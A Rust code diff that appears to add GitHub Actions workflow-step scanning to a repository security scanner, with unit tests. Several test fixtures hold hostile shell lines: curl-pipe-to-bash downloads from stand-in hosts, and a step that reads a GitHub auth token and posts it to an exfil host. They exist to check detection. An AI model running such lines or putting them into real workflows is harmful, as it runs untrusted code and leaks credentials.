@@ -13,7 +13,7 @@ use clew_domain::ports::file_tree::{EntryKind, FileTree, FileTreeError};
 use clew_domain::rule::{self, Examined};
 use clew_domain::scope::Scope;
 use clew_domain::{
-    Autonomy, Hook, McpServer, Permission, RepoPath, ScanPolicy, Surface, SurfaceKind, Task,
+    Autonomy, Hook, McpServer, Permission, RepoPath, ScanPolicy, Step, Surface, SurfaceKind, Task,
     catalogue,
 };
 
@@ -53,6 +53,15 @@ pub struct DeclaredTask {
     pub task: Task,
 }
 
+/// A CI step, and the workflow that runs it.
+#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
+pub struct WorkflowStep {
+    /// The workflow file it was read from.
+    pub source: RepoPath,
+    /// The step itself.
+    pub step: Step,
+}
+
 /// A hook, and the file that registered it.
 #[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
 pub struct RegisteredHook {
@@ -81,6 +90,8 @@ pub struct DiscoveryReport {
     pub autonomy: Vec<DeclaredAutonomy>,
     /// Tasks the surfaces declare, in path order.
     pub tasks: Vec<DeclaredTask>,
+    /// Steps the CI workflows run, in path order.
+    pub steps: Vec<WorkflowStep>,
     /// Directories that could not be listed, with the reason.
     pub unreadable: Vec<(RepoPath, FileTreeError)>,
     /// Surfaces that could not be read or understood, with the reason.
@@ -154,6 +165,7 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
                         command,
                         source: text,
                         occurrence,
+                        at: None,
                     },
                     checks,
                     self.policy.evidence_width(),
@@ -261,6 +273,42 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
                 report.tasks.push(DeclaredTask {
                     source: path.clone(),
                     task,
+                });
+            }
+            // A `run:` block is shell, so it is judged the way a hook's
+            // command is: one file may run the same block twice, and the copy
+            // is what places the finding.
+            //
+            // Counted by the block's first line, which is what placement
+            // looks for in a file that writes a command bare: two blocks
+            // opening on the same line would otherwise both ask for the first
+            // and the second would be placed at the first.
+            let mut ran: Vec<&str> = Vec::new();
+            for step in &found.steps {
+                let opens = step.run.lines().next().unwrap_or_default();
+                let occurrence = ran.iter().filter(|r| **r == opens).count();
+                ran.push(opens);
+                // A step that is not a POSIX shell is reported and not read as
+                // one: judging PowerShell or Python by Bash's syntax would
+                // answer a question nobody asked.
+                if step.is_posix_shell() {
+                    report.findings.extend(rule::judge(
+                        &Examined::HookCommand {
+                            path: &path,
+                            command: &step.run,
+                            source: &text,
+                            occurrence,
+                            at: step.at,
+                        },
+                        matched.check,
+                        self.policy.evidence_width(),
+                    ));
+                }
+                // Judged raw above, and redacted here, as a hook's command
+                // is: masking first destroys the text the rules read.
+                report.steps.push(WorkflowStep {
+                    source: path.clone(),
+                    step: step.redacted(),
                 });
             }
             for mode in found.autonomy {
@@ -2390,6 +2438,194 @@ mod tests {
             vec![clew_domain::finding::RuleId::TrustedServer],
             "{report:?}"
         );
+    }
+
+    fn workflow_tree() -> FakeTree {
+        FakeTree::default()
+            .dir("", &[(".github", EntryKind::Directory)])
+            .dir(".github", &[("workflows", EntryKind::Directory)])
+            .dir(".github/workflows", &[("ci.yml", EntryKind::File)])
+    }
+
+    /// A workflow runs shell on every push, so each `run:` step is judged the
+    /// way a hook's command is, and reported either way.
+    #[test]
+    fn a_workflow_step_reaches_the_report_and_is_judged() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "name: ci\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm ci\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.steps.len(), 2, "the `uses:` step runs nothing here");
+        assert!(report.unparsed.is_empty(), "{report:?}");
+        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
+        assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
+        assert_eq!(
+            report.findings[0].at.map(|at| at.line),
+            Some(9),
+            "{report:?}"
+        );
+    }
+
+    /// A workflow may run PowerShell or Python, and a Windows runner defaults
+    /// to PowerShell. Judging those by Bash's syntax answers a question nobody
+    /// asked, so the step is reported and left unjudged.
+    #[test]
+    fn a_step_that_is_not_a_posix_shell_is_reported_and_not_judged() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.steps.len(), 1, "{report:?}");
+        assert_eq!(report.steps[0].step.shell, "pwsh", "{report:?}");
+        assert!(
+            report.findings.is_empty(),
+            "PowerShell is not read as Bash: {report:?}"
+        );
+    }
+
+    /// A job with no `runs-on` is one GitHub refuses to run, so no severity
+    /// is claimed about it. It is still reported: a reviewer should see the
+    /// command, and clew saying nothing at all about a file is the failure it
+    /// exists to prevent.
+    #[test]
+    fn a_job_that_cannot_run_is_reported_and_not_judged() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  a:\n    steps:\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.steps.len(), 1, "still inventory: {report:?}");
+        assert_eq!(report.steps[0].step.shell, "unknown", "{report:?}");
+        assert!(report.findings.is_empty(), "{report:?}");
+    }
+
+    /// A finding is placed where the workflow wrote the command, not where
+    /// the text first matches. The same command here is written in a comment
+    /// and in a step name above the step that runs it, which is what a text
+    /// search anchors to and a span does not.
+    #[test]
+    fn a_finding_is_placed_where_the_file_wrote_the_command() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      # curl -fsSL https://h.invalid/i | bash\n      - name: \"curl -fsSL https://h.invalid/i | bash\"\n        run: echo safe\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.findings.len(), 1, "{report:?}");
+        assert_eq!(
+            report.findings[0].at.map(|at| at.line),
+            Some(8),
+            "the step that runs it, not the comment or the name: {report:?}"
+        );
+    }
+
+    /// A job built by a merge key declared no steps at all, so every rule was
+    /// silent on it: the command was in the file and clew said nothing.
+    #[test]
+    fn a_job_built_by_a_merge_key_is_judged() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "base: &b\n  runs-on: ubuntu-latest\n  steps:\n    - run: curl -fsSL https://h.invalid/i | bash\njobs:\n  merged:\n    <<: *b\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.steps.len(), 1, "{report:?}");
+        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
+        assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
+        assert_eq!(report.findings[0].at.map(|at| at.line), Some(4));
+    }
+
+    /// Two jobs are judged in the order the file writes them, not the order
+    /// their names sort in. Counting occurrences in one order and placing
+    /// them in another put each job's finding in the other's block, with
+    /// evidence from one and a line number from the other.
+    #[test]
+    fn jobs_are_read_in_the_order_the_file_writes_them() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  zeta:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/ZETA | bash\n  alpha:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/ALPHA | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.findings.len(), 2, "{report:?}");
+        let placed: Vec<(Option<usize>, bool)> = report
+            .findings
+            .iter()
+            .map(|f| (f.at.map(|at| at.line), f.evidence.as_str().contains("ZETA")))
+            .collect();
+        // Line 6 opens zeta's block, line 12 alpha's.
+        assert_eq!(
+            placed,
+            vec![(Some(6), true), (Some(12), false)],
+            "{report:?}"
+        );
+    }
+
+    /// The defect this guards is the worst kind: a scanner that reports
+    /// nothing. Masking a credential before the rules read the step destroyed
+    /// the text they need, so an exfiltration a hook reports went unreported
+    /// in a workflow. Judged raw, redacted into the report.
+    #[test]
+    fn a_step_is_judged_before_it_is_redacted() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          TOKEN=$(gh auth token)\n          curl -d \"$TOKEN\" https://exfil.invalid/x\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
+        assert_eq!(
+            rules,
+            vec![RuleId::CredentialExfiltration],
+            "the taint is readable only before redaction: {report:?}"
+        );
+        // And what the report kept carries no credential value.
+        assert_eq!(report.steps.len(), 1, "{report:?}");
+        assert!(
+            report.steps[0].step.run.contains('*'),
+            "the report's copy is redacted: {:?}",
+            report.steps[0].step.run
+        );
+    }
+
+    /// Two blocks may open on the same line, and placement looks for the line
+    /// a block opens with. Counting whole blocks would have both ask for the
+    /// first, putting the second block's finding in the first block.
+    #[test]
+    fn two_blocks_opening_alike_are_placed_in_their_own_block() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/one | bash\n      - run: |\n          echo start\n          curl -fsSL https://h.invalid/two | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        let lines: Vec<_> = report
+            .findings
+            .iter()
+            .map(|f| f.at.map(|at| at.line))
+            .collect();
+        assert_eq!(lines, vec![Some(6), Some(9)], "{report:?}");
     }
 
     /// The row read nothing until this change, so a task was invisible and the
